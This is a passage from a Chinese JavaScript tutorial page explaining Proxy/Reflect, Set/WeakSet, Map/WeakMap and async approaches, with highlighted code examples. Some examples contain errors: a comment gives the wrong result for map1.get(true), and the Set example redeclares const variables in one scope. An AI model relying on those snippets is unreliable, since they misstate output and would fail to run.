    <span class="token keyword">return</span> Reflect<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span>target<span class="token punctuation">,</span> key<span class="token punctuation">,</span> value<span class="token punctuation">,</span> receiver<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
<span class="token punctuation">}</span><span class="token punctuation">;</span>
<span class="token keyword">let</span> proxy <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Proxy</span><span class="token punctuation">(</span>obj<span class="token punctuation">,</span> handler<span class="token punctuation">)</span><span class="token punctuation">;</span>
proxy<span class="token punctuation">.</span>name <span class="token operator">=</span> <span class="token string">&quot;李四&quot;</span><span class="token punctuation">;</span>
proxy<span class="token punctuation">.</span>age <span class="token operator">=</span> <span class="token number">24</span><span class="token punctuation">;</span>
<span class="token comment">// set name 李四</span>
<span class="token comment">// set age 24</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br></div></div><h4 id="_2-reflect及案例"><a href="#_2-reflect及案例" class="header-anchor">#</a> 2:Reflect及案例</h4> <ul><li><strong>将<code>Object</code>属于<code>语言内部的方法</code>放到<code>Reflect</code>上</strong></li> <li>将某些Object方法报错情况改成返回<code>false</code></li> <li>让<code>Object操作</code>变成<code>函数行为</code></li> <li><strong><code>Proxy</code>与<code>Reflect</code>相辅相成</strong></li> <li><strong><code>Proxy方法</code>和<code>Reflect方法</code>一一对应</strong></li> <li><code>Proxy</code>和<code>Reflect</code>联合使用，<strong>前者负责<code>拦截赋值操作</code>，后者负责<code>完成赋值操作</code></strong></li></ul> <blockquote><p>数据绑定：观察者模式</p></blockquote> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token keyword">const</span> observerQueue <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Set</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">const</span> <span class="token function-variable function">observe</span> <span class="token operator">=</span> <span class="token parameter">fn</span> <span class="token operator">=&gt;</span> observerQueue<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>fn<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">const</span> <span class="token function-variable function">observable</span> <span class="token operator">=</span> <span class="token parameter">obj</span> <span class="token operator">=&gt;</span> <span class="token keyword">new</span> <span class="token class-name">Proxy</span><span class="token punctuation">(</span>obj<span class="token punctuation">,</span> <span class="token punctuation">{</span>
    <span class="token function">set</span><span class="token punctuation">(</span>tgt<span class="token punctuation">,</span> key<span class="token punctuation">,</span> val<span class="token punctuation">,</span> receiver<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">const</span> result <span class="token operator">=</span> Reflect<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span>tgt<span class="token punctuation">,</span> key<span class="token punctuation">,</span> val<span class="token punctuation">,</span> receiver<span class="token punctuation">)</span><span class="token punctuation">;</span>
        observerQueue<span class="token punctuation">.</span><span class="token function">forEach</span><span class="token punctuation">(</span><span class="token parameter">v</span> <span class="token operator">=&gt;</span> <span class="token function">v</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> result<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">const</span> person <span class="token operator">=</span> <span class="token function">observable</span><span class="token punctuation">(</span><span class="token punctuation">{</span> age<span class="token operator">:</span> <span class="token number">10</span><span class="token punctuation">,</span> name<span class="token operator">:</span> <span class="token string">&quot;samy&quot;</span> <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">const</span> <span class="token function-variable function">print</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>person<span class="token punctuation">.</span>name<span class="token interpolation-punctuation punctuation">}</span></span><span class="token string"> is </span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>person<span class="token punctuation">.</span>age<span class="token interpolation-punctuation punctuation">}</span></span><span class="token string"> years old</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">observe</span><span class="token punctuation">(</span>print<span class="token punctuation">)</span><span class="token punctuation">;</span>
person<span class="token punctuation">.</span>name <span class="token operator">=</span> <span class="token string">&quot;samy2&quot;</span><span class="token punctuation">;</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br></div></div><h4 id="_3-set-weakset及案例"><a href="#_3-set-weakset及案例" class="header-anchor">#</a> 3:Set/WeakSet及案例</h4> <p>定义：类似于数组的数据结构，成员值都是唯一且没有重复的值；</p> <p>方法</p> <ul><li><strong>add()</strong>：添加值，返回实例</li> <li><strong>delete()</strong>：删除值，返回布尔值</li> <li><strong>has()</strong>：检查值，返回布尔值</li> <li><strong>clear()</strong>：清除所有成员</li> <li><strong>keys()</strong>：返回以属性值为遍历器的对象</li> <li><strong>values()</strong>：返回以属性值为遍历器的对象</li> <li><strong>entries()</strong>：返回以属性值和属性值为遍历器的对象</li> <li><strong>forEach()</strong>：使用回调函数遍历每个成员</li></ul> <p>应用场景</p> <ul><li><strong>去重字符串</strong>：<code>[...new Set(str)].join(&quot;&quot;)</code></li> <li><strong>去重数组</strong>：<code>[...new Set(arr)]</code>或<code>Array.from(new Set(arr))</code></li> <li>集合数组
<ul><li>声明：<code>const a = new Set(arr1)</code>、<code>const b = new Set(arr2)</code></li> <li><strong>并集</strong>：<code>new Set([...a, ...b])</code></li> <li><strong>交集</strong>：<code>new Set([...a].filter(v =&gt; b.has(v)))</code></li> <li><strong>差集</strong>：<code>new Set([...a].filter(v =&gt; !b.has(v)))</code></li></ul></li> <li>映射集合
<ul><li>声明：<code>let set = new Set(arr)</code></li> <li>映射：<code>set = new Set([...set].map(v =&gt; v * 2))</code>或<code>set = new Set(Array.from(set, v =&gt; v * 2))</code></li></ul></li></ul> <p><strong><code>WeakSet</code></strong></p> <p>定义：和Set结构类似，<strong>成员值只能是对象</strong></p> <p>方法</p> <ul><li><strong>add()</strong>：添加值，返回实例</li> <li><strong>delete()</strong>：删除值，返回布尔值</li> <li><strong>has()</strong>：检查值，返回布尔值</li></ul> <p><strong>应用场景</strong></p> <ul><li>储存DOM节点：DOM节点被移除时自动释放此成员，<strong>不用担心这些节点从文档移除时会引发内存泄漏</strong></li> <li>临时存放一组对象或存放跟对象绑定的信息：只要这些对象在外部消失，它在<code>WeakSet结构</code>中的引用就会自动消</li></ul> <p>重点难点</p> <ul><li>成员都是<code>弱引用</code>，<strong>垃圾回收机制不考虑<code>WeakSet结构</code>对此成员的引用</strong></li> <li>成员不适合引用，它会随时消失，<strong>因此ES6规定<code>WeakSet结构不可遍历</code></strong></li> <li>其他对象不再引用成员时，垃圾回收机制会自动回收此成员所占用的内存，不考虑此成员是否还存在于<code>WeakSet结构</code>中;</li></ul> <p>再说说<code>Set</code>的不重复性; <strong>要注意`引用数据类型和NaN</strong></p> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token comment">// 增加一个已有元素，则增加无效，会被自动去重</span>
<span class="token keyword">const</span> set1 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Set</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
set1<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>set1<span class="token punctuation">)</span> <span class="token comment">// Set(1) { 1 }</span>

<span class="token comment">// 传入的数组中有重复项，会自动去重</span>
<span class="token keyword">const</span> set2 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Set</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token string">'samy'</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token string">'samy'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>set2<span class="token punctuation">)</span> <span class="token comment">// Set(4) { 1, 2, 'samy', 3 }</span>

<span class="token comment">//Set`的不重复性中，要注意`引用数据类型和NaN</span>
<span class="token comment">// 两个对象都是不用的指针，所以没法去重</span>
<span class="token keyword">const</span> set1 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Set</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token punctuation">{</span>name<span class="token operator">:</span> <span class="token string">'samy'</span><span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token punctuation">{</span>name<span class="token operator">:</span> <span class="token string">'samy'</span><span class="token punctuation">}</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>set1<span class="token punctuation">)</span> <span class="token comment">// Set(4) { 1, { name: 'samy' }, 2, { name: 'samy' } }</span>

<span class="token comment">// 如果是两个对象是同一指针，则能去重</span>
<span class="token keyword">const</span> obj <span class="token operator">=</span> <span class="token punctuation">{</span>name<span class="token operator">:</span> <span class="token string">'samy'</span><span class="token punctuation">}</span>
<span class="token keyword">const</span> set2 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Set</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> obj<span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> obj<span class="token punctuation">]</span><span class="token punctuation">)</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>set2<span class="token punctuation">)</span> <span class="token comment">// Set(3) { 1, { name: 'samy' }, 2 }</span>

<span class="token comment">//咱们都知道 NaN !== NaN，NaN是自身不等于自身的，但是在Set中他还是会被去重</span>
<span class="token keyword">const</span> set <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Set</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">NaN</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">NaN</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>set<span class="token punctuation">)</span> <span class="token comment">// Set(2) { 1, NaN }</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br></div></div><p>利用Set的不重复性，可以实现数组去重</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token keyword">const</span> arr <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">66</span><span class="token punctuation">,</span> <span class="token number">9</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">]</span>

<span class="token comment">// Set可利用扩展运算符转为数组哦</span>
<span class="token keyword">const</span> quchongArr <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token operator">...</span><span class="token keyword">new</span> <span class="token class-name">Set</span><span class="token punctuation">(</span>arr<span class="token punctuation">)</span><span class="token punctuation">]</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>quchongArr<span class="token punctuation">)</span> <span class="token comment">// [1,  2, 3, 4, 5, 66, 9]</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br></div></div><h4 id="_4-map-weakmap及案例"><a href="#_4-map-weakmap及案例" class="header-anchor">#</a> 4:Map/WeakMap及案例</h4> <p>定义：类似于对象的数据结构，成员键可以是任何类型的值</p> <p>方法</p> <ul><li><strong>get()</strong>：返回键值对</li> <li><strong>set()</strong>：添加键值对，返回实例; //Set对应的是add()</li> <li><strong>delete()</strong>：删除键值对，返回布尔值</li> <li><strong>has()</strong>：检查键值对，返回布尔值</li> <li><strong>clear()</strong>：清除所有成员</li> <li><strong>keys()</strong>：返回以键为遍历器的对象</li> <li><strong>values()</strong>：返回以值为遍历器的对象</li> <li><strong>entries()</strong>：返回以键和值为遍历器的对象</li> <li><strong>forEach()</strong>：使用回调函数遍历每个成员</li></ul> <p><code>WeakMap</code></p> <p><strong>WeakMaps</strong> 提供了一种<strong>从外部扩展对象而不影响垃圾收集的方法</strong>。当咱们想要扩展一个对象，但是因为它是封闭的或者来自外部源而不能扩展时，可以应用<code>WeakMap</code>。</p> <p><strong>WeakMap</strong>只适用于 ES6 或以上版本。<strong>WeakMap</strong>是键和值对的集合，其中键<strong>必须是对象</strong>。</p> <p><strong>WeakMaps</strong>的有趣之处在于，它包含了对<code>map</code>内部键的弱引用。弱引用意味着如果对象被销毁，垃圾收集器将从<code>WeakMap</code>中删除整个条目，从而释放内存。</p> <p>定义：和Map结构类似，成员键只能是对象</p> <p><strong>属性/方法</strong></p> <ul><li><strong>constructor</strong>：构造函数，返回WeakMap, 属性；</li> <li><strong>get()</strong>：返回键值对</li> <li><strong>set()</strong>：添加键值对，返回实例</li> <li><strong>delete()</strong>：删除键值对，返回布尔值</li> <li><strong>has()</strong>：检查键值对，返回布尔值</li></ul> <p><strong>应用场景</strong></p> <ul><li>储存DOM节点：DOM节点被移除时自动释放此成员键，不用担心这些节点从文档移除时会引发内存泄漏</li> <li>部署私有属性：内部属性是实例的弱引用，删除实例时它们也随之消失，不会造成内存泄漏</li></ul> <p><strong>重点难点</strong></p> <ul><li>成员键都是<code>弱引用</code>，垃圾回收机制不考虑<code>WeakMap结构</code>对此成员键的引用</li> <li>成员键不适合引用，它会随时消失，因此ES6规定<code>WeakMap结构不可遍历</code></li> <li>其他对象不再引用成员键时，垃圾回收机制会自动回收此成员所占用的内存，不考虑此成员是否还存在于<code>WeakMap结构</code>中</li> <li>一旦不再需要，成员会自动消失，不用手动删除引用</li> <li>弱引用的<code>只是键而不是值</code>，值依然是正常引用</li> <li>即使在外部消除了成员键的引用，内部的成员值依然存在</li></ul> <h5 id="使用案例"><a href="#使用案例" class="header-anchor">#</a> 使用案例</h5> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token comment">//Map`对比`object`最大的好处就是，key不受`类型限制</span>
<span class="token comment">// 定义map</span>
<span class="token keyword">const</span> map1 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Map</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token comment">// 新增键值对 使用 set(key, value)</span>
map1<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span>
map1<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span>
map1<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span><span class="token string">'哈哈'</span><span class="token punctuation">,</span> <span class="token string">'嘻嘻嘻'</span><span class="token punctuation">)</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>map1<span class="token punctuation">)</span> <span class="token comment">// Map(3) { true =&gt; 1, 1 =&gt; 2, '哈哈' =&gt; '嘻嘻嘻' }</span>
<span class="token comment">// 判断map是否含有某个key 使用 has(key)</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>map1<span class="token punctuation">.</span><span class="token function">has</span><span class="token punctuation">(</span><span class="token string">'哈哈'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment">// true</span>
<span class="token comment">// 获取map中某个key对应的value 使用 get(key)</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>map1<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment">// 2</span>
<span class="token comment">// 删除map中某个键值对 使用 delete(key)</span>
map1<span class="token punctuation">.</span><span class="token function">delete</span><span class="token punctuation">(</span><span class="token string">'哈哈'</span><span class="token punctuation">)</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>map1<span class="token punctuation">)</span> <span class="token comment">// Map(2) { true =&gt; 1, 1 =&gt; 2 }</span>

<span class="token comment">// 定义map，也可传入键值对数组集合</span>
<span class="token keyword">const</span> map2 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Map</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token boolean">true</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token string">'哈哈'</span><span class="token punctuation">,</span> <span class="token string">'嘻嘻嘻'</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>map2<span class="token punctuation">)</span> <span class="token comment">// Map(3) { true =&gt; 1, 1 =&gt; 2, '哈哈' =&gt; '嘻嘻嘻' }</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br></div></div><div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token keyword">var</span> map <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">WeakMap</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">var</span> pavloHero <span class="token operator">=</span> <span class="token punctuation">{</span>
    first<span class="token operator">:</span> <span class="token string">&quot;Pavlo&quot;</span><span class="token punctuation">,</span>
    last<span class="token operator">:</span> <span class="token string">&quot;Hero&quot;</span>
<span class="token punctuation">}</span><span class="token punctuation">;</span>
<span class="token keyword">var</span> gabrielFranco <span class="token operator">=</span> <span class="token punctuation">{</span>
    first<span class="token operator">:</span> <span class="token string">&quot;Gabriel&quot;</span><span class="token punctuation">,</span>
    last<span class="token operator">:</span> <span class="token string">&quot;Franco&quot;</span>
<span class="token punctuation">}</span><span class="token punctuation">;</span>
map<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span>pavloHero<span class="token punctuation">,</span> <span class="token string">&quot;This is Hero&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
map<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span>gabrielFranco<span class="token punctuation">,</span> <span class="token string">&quot;This is Franco&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>map<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>pavloHero<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//This is Hero</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br></div></div><h5 id="map与weakmap的比较"><a href="#map与weakmap的比较" class="header-anchor">#</a> Map与WeakMap的比较</h5> <p><code>WeakMap</code> 允许垃圾收集器执行其回收任务，但<code>Map</code>不允许。对于手动编写的 <code>Map</code>，数组将保留对键对象的引用，以防止被垃圾回收。<strong>但在<code>WeakMap</code>中，对键对象的引用被“弱”保留，这意味着在没有其他对象引用的情况下</strong>，它们不会阻止垃圾回收。</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token keyword">var</span> map <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Map</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token keyword">var</span> weakMap <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">WeakMap</span><span class="token punctuation">(</span><span class="token punctuation">)</span>

<span class="token keyword">var</span> a <span class="token operator">=</span> <span class="token punctuation">{</span>
  x<span class="token operator">:</span> <span class="token number">12</span>
<span class="token punctuation">}</span><span class="token punctuation">;</span>
<span class="token keyword">var</span> b <span class="token operator">=</span> <span class="token punctuation">{</span>
  y<span class="token operator">:</span> <span class="token number">12</span>
<span class="token punctuation">}</span><span class="token punctuation">;</span>
map<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
weakMap<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span>b<span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>map<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//Map { { x: 12 } =&gt; 1 }</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>weakMap<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//WeakMap { [items unknown] }</span>

console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>map<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//1</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>weakMap<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>b<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//2</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br></div></div><h3 id="异步"><a href="#异步" class="header-anchor">#</a> 异步</h3> <h4 id="_1-异步编程六种方案"><a href="#_1-异步编程六种方案" class="header-anchor">#</a> 1:异步编程六种方案</h4> <p><strong>异步编程进化史</strong>：<strong>callback -&gt; promise/A+ -&gt; generator -&gt; async/await，事件监听，发布订阅（总共6种）</strong></p> <h4 id="_2-异步方案比较"><a href="#_2-异步方案比较" class="header-anchor">#</a> 2:异步方案比较</h4> <p>async/await 函数的实现，就是<strong>将 Generator 函数和自动执行器，包装在一个函数里。<strong>可以说是异步终极解决方案了。async 等于</strong>Generator+自动执行器</strong></p> <p><strong>async跟promise的比较</strong></p> <ul><li>处理 then 的调用链，能够更清晰准确的写出代码; <strong>能更好地处理 then 链；</strong></li> <li><strong>并且也能优雅地解决回调地狱问题</strong>。简约而干净Concise and clean；</li> <li><strong>错误处理Error handling</strong>；</li> <li>更好的<strong>处理中间值</strong>；</li> <li><strong>条件语句</strong>： 代码嵌套（6层）可读性较差，它们传达的意思只是需要将最终结果传递到最外层的Promise。使用async/await编写可以大大地提高可读性</li> <li>当然async/await函数也存在一些缺点，因为 await 将异步代码改造成了同步代码，<strong>如果多个异步代码没有依赖性却使用了 await 会导致性能上的降低</strong>，代码没有依赖性的话，完全可以使用 Promise.all 的方式。</li></ul> <blockquote><h5 id="假设我们需要分别读取-a、b、c-三个文件-具体代码如下"><a href="#假设我们需要分别读取-a、b、c-三个文件-具体代码如下" class="header-anchor">#</a> 假设我们需要分别读取 a、b、c 三个文件，具体代码如下：</h5></blockquote> <p><img src="/rat-summ/assets/img/17-35-38.ae6afb5a.jpg" alt="17-35-38"> 我们可以看出来 <strong>async</strong> 函数比起 <strong>Promise</strong> 的链式操作，以及 <strong>Generator</strong> 的手动执行，要方便得太多了，代码上也简洁明了，让我们看起来一目了然。</p> <blockquote><h5 id="如何实现sleep的效果-es5或者es6"><a href="#如何实现sleep的效果-es5或者es6" class="header-anchor">#</a> 如何实现sleep的效果（es5或者es6）</h5></blockquote> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token comment">//while循环的方式实现</span>
<span class="token keyword">function</span> <span class="token function">sleep</span><span class="token punctuation">(</span><span class="token parameter">delay</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">var</span> start <span class="token operator">=</span> Date<span class="token punctuation">.</span><span class="token function">now</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> expire <span class="token operator">=</span> start <span class="token operator">+</span> delay<span class="token punctuation">;</span>
    <span class="token keyword">while</span> <span class="token punctuation">(</span>Date<span class="token punctuation">.</span><span class="token function">now</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> expire<span class="token punctuation">)</span> <span class="token punctuation">;</span><span class="token comment">//while ((new Date()).getTime() - start &lt; delay) {</span>
    <span class="token keyword">return</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token comment">//执行sleep(1000)之后，休眠了1000ms之后输出了1111。上述循环的方式缺点很明显，容易造成死循环。</span>

<span class="token comment">//generator方式实现</span>
<span class="token keyword">function</span><span class="token operator">*</span> <span class="token function">sleep</span><span class="token punctuation">(</span><span class="token parameter">ms</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token comment">//通过generate来实现</span>
  <span class="token keyword">yield</span> <span class="token keyword">new</span> <span class="token class-name">Promise</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">resolve<span class="token punctuation">,</span> reject</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token number">111</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">setTimeout</span><span class="token punctuation">(</span>resolve<span class="token punctuation">,</span> ms<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token function">sleep</span><span class="token punctuation">(</span><span class="token number">500</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>value<span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token number">2222</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token comment">//generator方式实现</span>
<span class="token keyword">function</span> <span class="token function">delayPms</span><span class="token punctuation">(</span><span class="token parameter">time</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token comment">//promise的方式；</span>
